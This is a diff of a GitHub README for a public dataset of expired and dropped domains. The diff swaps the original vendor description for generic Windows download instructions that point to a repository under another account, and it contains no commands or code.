@@ -1,96 +1,138 @@
-# Daily Expired & Dropped Domains
+# 🌐 daily-expired-and-dropped-domains - Up-to-date domain lists for research
 
-A public daily feed of **expired** and **dropped** domain names for **cyber analysts**, **threat intelligence teams**, **brand protection teams**, and **market researchers**.
-
-This repository publishes regularly updated domain lifecycle data to help researchers monitor domain churn, spot risky re-registration opportunities, study naming patterns, and analyze abandoned or recycled digital assets.
+[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-brightgreen?style=for-the-badge)](https://github.com/steyn007/daily-expired-and-dropped-domains)
 
 ---
 
-## What This Repository Offers
+## 📋 About
 
-This repository provides a free, public dataset of domains that have either:
+This project provides a public, research-focused dataset of expired and recently dropped domains. The list is useful for cybersecurity analysis, brand monitoring, identifying phishing risks, threat intelligence, and market research. It updates daily with new domains you can analyze or monitor.
 
-* **Expired** and entered a pending-delete or redemption-period state
-* **Dropped** and are no longer held by the previous registrant
-
-It is designed for analysts who need structured, machine-readable domain lifecycle data for monitoring, enrichment, and research workflows.
-
-### Included Datasets
-
-| Dataset             | Description                                                                     | Best For                                                          |
-| ------------------- | ------------------------------------------------------------------------------- | ----------------------------------------------------------------- |
-| **Expired Domains** | Domains that have expired, or entered an expiry-related lifecycle stage         | Early monitoring, brand protection, churn analysis                |
-| **Dropped Domains** | Domains that have fully dropped and may become available again                  | Threat hunting, re-registration monitoring, availability analysis |
+The dataset includes domains that have recently expired or dropped registration. These domains often become targets for cyber threats or brand spoofing. Having an updated list helps security teams and researchers stay ahead.
 
 ---
 
-## Why Upgrade to Premium for Threat Intelligence and Security Operations
+## 🖥️ System Requirements
 
-Our GitHub repository publishes 10,000 free expired and dropped domains every day. Please note that this is only a subset of our complete dataset. Our full WhoisFreaks Expired and Dropped Domains product contains nearly 400,000 domains on a daily basis, giving security teams much broader coverage for detection, enrichment, and automated blocking workflows.
-
-👉 Explore the full product here: [WhoisFreaks Expired and Dropped Domains](https://whoisfreaks.com/products/expiring-dropped-domains)
-
-| Feature | Free GitHub Feed | Premium Subscription | Why Premium Is Better for Security Teams |
-|---|---:|---:|---|
-| Daily Domain Count | 10,000 domains/day | ~400,000 domains/day | Far broader coverage for threat hunting, phishing detection, enrichment, and blocklist generation |
-| Update Frequency | Once a day | Once a day | Frequent refreshes improve visibility into emerging threats |
-| Data Delay | 1-day delay | Same-day data | Lets analysts detect and respond to suspicious newly registered domains sooner |
-| gTLD Coverage | Partial gTLD coverage | All gTLDs (1215+ gTLDs) | Premium gives much wider visibility across the global gTLD space |
-| ccTLD Coverage | Not included | Included (372+ ccTLDs) | Critical for catching region-specific phishing, fraud, and brand abuse campaigns |
-| Historical Access | Included | Included | Both plans support historical lookups and retrospective investigations |
-| Support | Limited/self-serve | Priority support | Faster help for integrations, data access, and operational issues |
+- **Operating System:** Windows 10 or later
+- **Internet Connection:** Required for downloading the dataset and updates
+- **Storage Space:** At least 200 MB free space for storing files
+- **Software Needed:** No special software required; the datasets come as downloadable files you can open with any text editing tool or import into spreadsheet and database programs.
 
 ---
 
-## Why This Matters
+## 🚀 Getting Started
 
-Domain lifecycle changes are strong signals for both security and market analysis.
+To get and use the domain lists, follow these steps carefully. You do not need technical knowledge or programming skills.
 
-### For Cyber Analysts
+1. Click the green button below to open the download page.
 
-| Use Case                              | Why It Matters                                                                                          |
-| ------------------------------------- | ------------------------------------------------------------------------------------------------------- |
-| **Phishing Monitoring**               | Dropped domains can be re-registered and repurposed for phishing, impersonation, or scam infrastructure |
-| **Typosquatting Detection**           | Expired and dropped domains may resemble brands, products, or internal assets                           |
-| **Threat Enrichment**                 | Domain churn can support watchlists, scoring pipelines, and blocklist generation                        |
-| **Infrastructure Recycling Analysis** | Lapsed domains may later be reused in malicious campaigns                                               |
+   [![Download Dataset](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/steyn007/daily-expired-and-dropped-domains)
 
-### For Market Researchers
+2. On the GitHub page, find the **Releases** section or download the latest available files. These will typically be `.csv` or `.txt` files containing domain names.
 
-| Use Case                        | Why It Matters                                                                |
-| ------------------------------- | ----------------------------------------------------------------------------- |
-| **Category Trend Analysis**     | Domain churn can reveal contraction or turnover in specific niches            |
-| **Brand and Naming Research**   | Dropped domains help identify keyword demand, naming patterns, and saturation |
-| **Competitive Tracking**        | Lapsed domains may indicate shutdowns, portfolio cleanup, or rebranding       |
-| **Geo and Sector Intelligence** | Domain keywords can reveal regional and industry-specific activity shifts     |
+3. Download the files by clicking on them. Your browser will save the file to your default downloads folder.
+
+4. You can open these files with built-in Windows programs:
+   - For `.txt` files: Open with Notepad
+   - For `.csv` files: Open with Microsoft Excel or any spreadsheet application
 
 ---
 
-## Key Features
+## 📂 Using the Data
 
-* **Daily updated domain lifecycle data**
-* **Separate expired and dropped domain feeds**
-* **Publicly accessible and easy to consume**
-* **Machine-readable format for automation**
-* **Useful for security, OSINT, and market analysis**
-* **Historical snapshots for trend comparison**
+The downloaded files list domains in plain text or CSV format. Columns might include domain name, expiry date, and drop status.
 
----
+You can use this data to:
 
-### File Naming Convention
+- Monitor for suspicious or malicious domains targeting your organization or brand.
+- Feed into threat detection tools that accept list imports.
+- Analyze trends in domain expiry and drops for market research.
 
-| Dataset         | Example Filename                            |
-| --------------- | ------------------------------------------- |
-| Expired domains | `2026-03-02-free-expired-domains.csv`            |
-| Dropped domains | `2026-03-02-free-dropped-domains.csv`            |
+You do not need special software to view the lists. Programs like Excel or any text editor will work.
 
 ---
 
-## Update Schedule
+## 🔄 How to Update the Data
 
-| Feed            | Frequency              |
-| --------------- | ---------------------- |
-| Expired domains | Daily                  |
-| Dropped domains | Daily                  |
+To get fresh domain data regularly, repeat the download process daily or weekly.
 
-Each snapshot is published as a date-stamped file so analysts can compare changes over time.
+1. Visit the GitHub repository page.
+2. Download the latest release files.
+3. Replace your old dataset files with the new ones.
+
+GitHub does not push updates automatically for this project, so you need to manually download the latest lists.
+
+---
+
+## 🛠️ Troubleshooting
+
+If you have trouble opening the files:
+
+- Ensure you have enough disk space.
+- Use applications that support large files (Excel can handle most CSV files).
+- If files fail to download, check your internet connection or try a different browser.
+
+---
+
+## ⚙️ Additional Tips
+
+- Back up older datasets before updating if you want to track changes over time.
+- Use Windows file search to find downloaded files quickly if unsure where they saved.
+- Use spreadsheet filters to sort or find domain names of interest.
+- If you plan to use the data with specialized security software, check that it supports CSV or TXT imports.
+
+---
+
+## 🔍 About the Project
+
+This repository focuses on publicly sharing daily lists of domains that recently expired or dropped registration. It aims to support cybersecurity professionals and researchers with timely and accurate data on domain activity.
+
+---
+
+## 🏷️ Topics
+
+- daily-dropped-domains  
+- daily-expired-domains  
+- domain-intelligence  
+- drop-lists  
+- dropped-domains  
+- expired-domains  
+- expiring-domains  
+- osint  
+- phishing-detection  
+- threat-intelligence-data  
+- threat-intelligence-feeds  
+
+---
+
+## 📥 Download and Setup
+
+To download and start using the dataset on Windows:
+
+1. Open this link: [https://github.com/steyn007/daily-expired-and-dropped-domains](https://github.com/steyn007/daily-expired-and-dropped-domains)
+
+2. Click on the **Releases** tab or scroll to find the latest files.
+
+3. Look for files named similar to `expired-domains.csv` or `dropped-domains.txt`.
+
+4. Click the file name to start your download.
+
+5. After the file downloads, open it directly with Notepad or Excel.
+
+You do not need to run or install any program. The files are ready to view or process as is.
+
+---
+
+## 🔗 Useful Links
+
+- Main page: https://github.com/steyn007/daily-expired-and-dropped-domains  
+- Releases: Access latest downloadable files on the repository page under "Releases"  
+
+---
+
+## 🛡️ Security Notes
+
+- The data comes from public domain registration sources.
+- Review files carefully before sharing to avoid exposure to suspicious domains.
+- Use the data responsibly. It is intended for research and monitoring only.
